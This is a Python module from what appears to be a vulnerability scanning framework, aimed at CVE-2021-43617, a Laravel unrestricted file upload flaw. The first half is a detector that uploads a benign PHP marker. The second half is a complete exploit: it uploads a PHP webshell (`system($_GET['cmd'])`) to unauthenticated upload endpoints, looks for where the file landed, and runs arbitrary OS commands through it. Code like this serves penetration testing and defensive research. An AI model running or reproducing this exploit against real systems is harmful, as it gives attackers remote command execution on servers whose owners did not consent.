#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2021-43617')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2021-43617: Laravel Unrestricted File Upload RCE Scanner

This module tries to detect vulnerable Laravel installations whose upload
handling accepts an executable PHP file (e.g. a `.php` dropped under its
original name into a web-reachable, PHP-executing directory), which can lead
to remote code execution. CVE-2021-43617 is attributed by NVD to a MIME
allowlist that omits executable types such as `.phar`; this detector confirms
the more general unrestricted-upload class by uploading a benign `.php` marker
and verifying it is both publicly served and executed.
"""

import uuid

import requests
from urllib.parse import urljoin
from typing import Optional, Dict

from modules.core import http_config
from modules.core.http_config import app_url


COMMON_UPLOAD_PATHS = [
    "/upload",
    "/uploads",
    "/file/upload",
    "/api/upload",
    "/api/v1/upload",
    "/storage/upload",
    "/user/upload",
    "/media/upload",
    "/files",
    "/upload.php",   # legacy
    "/uploader",     # catch-all
]

import re as _re
from modules.cves.metadata import version_suppresses as _version_suppresses


def _detected_framework_version(sess, base) -> Optional[str]:
    """Best-effort laravel/framework version from a web-reachable composer.lock.

    Used only for a FAIL-OPEN version gate below — returns None (proceed as normal)
    on any error or when no version source is reachable. Never raises.
    """
    try:
        r = sess.get(app_url(base, "/composer.lock"), timeout=8, verify=False)
        if r.status_code == 200 and "laravel/framework" in (r.text or ""):
            m = _re.search(
                r'"name"\s*:\s*"laravel/framework".*?"version"\s*:\s*"v?([0-9]+\.[0-9]+\.[0-9]+)',
                r.text, _re.S)
            if m:
                return m.group(1)
    except Exception:
        pass
    return None


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs) -> Optional[Dict]:
    """
    Scan for vulnerable file upload endpoints that accept an executable PHP file.

    Steps:
        1. Try common upload endpoints
        2. Upload a harmless PHP marker file (.php)
        3. Verify upload success
        4. Check if the uploaded file becomes publicly accessible and executes

    Returns:
        Verdict with vulnerability details or None
    """

    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url

    target_url = target_url.rstrip("/")

    # Fail-open version gate: the real CVE-2021-43617 code path is laravel/framework <= 8.70.2.
    # If the target leaks a framework version OUTSIDE that range, do NOT claim vulnerable — the
    # generic upload probe below would otherwise false-positive on any patched host with an
    # unvalidated upload. Unknown version -> proceed unchanged (labs that leak nothing are
    # unaffected). This prevents wrong-version false positives in the field.
    _ver = _detected_framework_version(sess, target_url)
    if _ver:
        _msg = _version_suppresses("CVE-2021-43617", _ver)
        if _msg:
            return {
                "cve": "CVE-2021-43617",
                "vulnerable": False,
                "status": "version_mismatch",
                "verdict": "version_mismatch",
                "version": _ver,
                "reason": _msg,
            }

    marker = "lvc43617_" + uuid.uuid4().hex
    filename = f"{marker}.php"
    payload_content = f"<?php echo '{marker}'; ?>".encode("ascii")

    files = {
        "file": (filename, payload_content, "application/octet-stream")
    }

    best_sink = None
    for path in COMMON_UPLOAD_PATHS:
        upload_url = app_url(target_url, path)

        try:
            response = sess.post(upload_url, files=files, timeout=10)

            # Upload rejected
            if response.status_code >= 400:
                continue

            # Attempt to extract uploaded file URL from JSON, form, etc.
            uploaded_url = _extract_uploaded_url(response, target_url, filename)
            if uploaded_url and not uploaded_url.startswith(("http://", "https://")):
                uploaded_url = urljoin(target_url + "/", uploaded_url.lstrip("/"))

            if not uploaded_url:
                # If unknown, try guessing common Laravel storage paths
                guess = app_url(target_url, f"/uploads/{filename}")
                uploaded_url = guess

            # Now test if file is publicly accessible
            test = sess.get(uploaded_url, timeout=10)

            body = test.text or ""
            if test.status_code == 200 and marker in body and "<?php" not in body:
                return {
                    "cve": "CVE-2021-43617",
                    "vulnerable": True,
                    "status": "confirmed_vulnerable",
                    "verdict": "confirmed_vulnerable",
                    "proof_type": "safe_active",
                    "endpoint": upload_url,
                    "uploaded_url": uploaded_url,
                    "http_status": test.status_code,
                    "payload": filename,
                    "evidence": f"Uploaded PHP marker executed and returned {marker}",
                    "indicator": "PHP upload accepted, publicly accessible, and executed",
                    "artifacts": {
                        "marker": marker,
                        "payload": filename,
                    },
                }
            if test.status_code == 200 and not best_sink:
                best_sink = {
                    "cve": "CVE-2021-43617",
                    "vulnerable": False,
                    "status": "sink_reachable",
                    "verdict": "sink_reachable",
                    "proof_type": "upload_handshake",
                    "endpoint": upload_url,
                    "uploaded_url": uploaded_url,
                    "http_status": test.status_code,
                    "payload": filename,
                    "evidence": "Upload accepted and file was publicly reachable, but PHP execution was not confirmed",
                    "indicator": "File upload accepted and publicly accessible",
                    "artifacts": {
                        "marker": marker,
                        "payload": filename,
                    },
                }

        except Exception:
            continue

    return best_sink


def _extract_uploaded_url(response, base_url, filename) -> Optional[str]:
    """
    Try to extract uploaded file URL from API responses.
    """

    try:
        # JSON-style API: {"url": "..."}
        data = response.json()
        for key in ["url", "file", "path", "location"]:
            if key in data:
                return data[key]
    except Exception:
        pass

    # Fall back: look for the filename in the body
    if filename in response.text:
        # Return a best guess from the body
        return urljoin(base_url, f"/uploads/{filename}")

    return None


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2021-43617 exploitation half — Laravel unrestricted file upload -> RCE.

Split from the original modules/cve_2021_43617.py (detection half: modules/cves/cve_2021_43617.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import uuid
from urllib.parse import urljoin

from modules.core import http_config


# --------------------------------------------------------------------------- #
# Exploitation (CVE-2021-43617) — unrestricted file upload -> RCE              #
# --------------------------------------------------------------------------- #
#
# vuln_class      : rce   (CWE-434: unrestricted upload of dangerous type)
# command_capable : True  (delivers an OS command via the uploaded webshell)
# auth_required   : False (the upload route is unauthenticated)
# app_key_required: False (no crypto / serialization involved)
#
# Flow:
#   1. POST a `<?php system($_GET['cmd']); ?>` webshell named <rand>.php to an
#      unauthenticated upload endpoint that stores files under their original
#      client name in a web-reachable, PHP-executing directory.
#   2. Resolve the stored URL (from the JSON {"url": ...} response, or guesses).
#   3. GET that URL with ?cmd=<command>; success ONLY if the command output is
#      observed in the response (and the response is NOT raw PHP source, which
#      would mean the .php was served as text rather than executed).

# Endpoints to try, in order. The lab's real route is "/upload"; the rest mirror
# the detector's COMMON_UPLOAD_PATHS so the exploit covers the same surface.
_EXPLOIT_UPLOAD_PATHS = ["/upload"] + [p for p in COMMON_UPLOAD_PATHS if p != "/upload"]


def _shell_url_candidates(upload_response, base_url, filename):
    """Yield plausible URLs where the just-uploaded webshell may be reachable."""
    seen = set()

    # 1. URL the server told us about (absolute or relative).
    server_url = _extract_uploaded_url(upload_response, base_url, filename)
    if server_url:
        if not server_url.startswith(("http://", "https://")):
            server_url = urljoin(base_url + "/", server_url.lstrip("/"))
        if server_url not in seen:
            seen.add(server_url)
            yield server_url

    # 2. Common Laravel public storage locations under the same name.
    for guess in (f"/uploads/{filename}", f"/storage/{filename}",
                  f"/files/{filename}", f"/{filename}"):
        cand = urljoin(base_url + "/", guess.lstrip("/"))
        if cand not in seen:
            seen.add(cand)
            yield cand


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt unrestricted-upload -> RCE exploitation against a live target.

    Uploads a PHP webshell to an unauthenticated upload endpoint and executes
    `command` (default "echo CVE-2021-43617 PoC && id && hostname") via it. success=True only if the command output is
    actually observed (proves server-side PHP execution, not text reflection).
    Never raises — returns the contract dict with success=False on any failure.
    """
    result = {
        "cve": "CVE-2021-43617",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    sess = session or http_config.get_auth_session()
    cmd = command or "echo CVE-2021-43617 PoC && id && hostname"

    try:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        base = target_url.rstrip("/")

        # Unique webshell so re-runs don't collide and we can detect a stale hit.
        marker = uuid.uuid4().hex[:8]
        shell_name = f"poc{marker}.php"
        webshell = b"<?php echo 'RCE-43617-START'; system($_GET['cmd']); echo 'RCE-43617-END'; ?>"

        last_reason = "no upload endpoint accepted a PHP-named file"

        for path in _EXPLOIT_UPLOAD_PATHS:
            upload_url = urljoin(base + "/", path.lstrip("/"))
            try:
                up = sess.post(
                    upload_url,
                    files={"file": (shell_name, webshell, "application/octet-stream")},
                    timeout=15,
                )
            except Exception as e:
                last_reason = f"upload POST to {upload_url} failed: {e}"
                continue

            if up.status_code >= 400:
                last_reason = f"{upload_url} rejected upload (HTTP {up.status_code})"
                continue

            # Try every plausible location the shell could have landed.
            for shell_url in _shell_url_candidates(up, base, shell_name):
                try:
                    probe = sess.get(shell_url, params={"cmd": cmd}, timeout=15)
                except Exception:
                    continue

                if probe.status_code != 200 or not probe.text:
                    continue

                body = probe.text

                # If the raw PHP source is echoed back, the .php was served as
                # TEXT (not executed) -> not RCE on this target. Reject it.
                if "<?php" in body and "RCE-43617-START" not in body:
                    last_reason = (
                        f"{shell_url} served PHP as text (not executed); "
                        "directory does not run uploaded .php"
                    )
                    continue

                if "RCE-43617-START" in body and "RCE-43617-END" in body:
                    # Extract exactly what the command produced, between markers.
                    out = body.split("RCE-43617-START", 1)[1]
                    out = out.split("RCE-43617-END", 1)[0].strip()

                    result["success"] = True
                    result["evidence"] = (
                        f"$ {cmd}\n{out}" if out
                        else f"command `{cmd}` executed (no stdout captured)"
                    )
                    result["detail"] = (
                        f"Uploaded PHP webshell to {upload_url}; executed `{cmd}` "
                        f"via {shell_url}"
                    )
                    result["artifacts"] = {
                        "endpoint": upload_url,
                        "webshell_url": shell_url,
                        "webshell_param": "cmd",
                        "payload": shell_name,
                        "marker": marker,
                        "command": cmd,
                    }
                    return result

                # 200 but no markers — file not executing here; keep trying.
                last_reason = (
                    f"{shell_url} returned HTTP 200 but webshell did not execute "
                    "(no command output observed)"
                )

        result["reason"] = last_reason
        result["detail"] = "Upload-to-RCE not confirmed against target"
        return result

    except Exception as e:  # never raise to the caller
        result["reason"] = f"exploit error: {e}"
        result["detail"] = "Exploit aborted due to internal error"
        return result
